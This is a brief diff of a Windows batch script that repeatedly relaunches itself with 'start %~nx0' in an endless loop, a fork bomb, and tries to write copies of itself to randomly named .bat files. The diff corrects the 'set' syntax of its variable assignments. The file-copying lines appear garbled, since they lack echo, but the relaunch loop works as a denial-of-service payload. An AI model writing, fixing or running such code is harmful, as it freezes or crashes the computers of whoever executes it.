@@ -1,10 +1,10 @@
 :a
 start %~nx0
-var=%random%-%random%-%random%-%random%.bat
+set var=%random%-%random%-%random%-%random%.bat
 
 :a > %var%
 start %~nx0 >> %var%
-var=%random%.bat >> %var%
+set var=%random%.bat >> %var%
 goto a >> %var%
 
 goto a
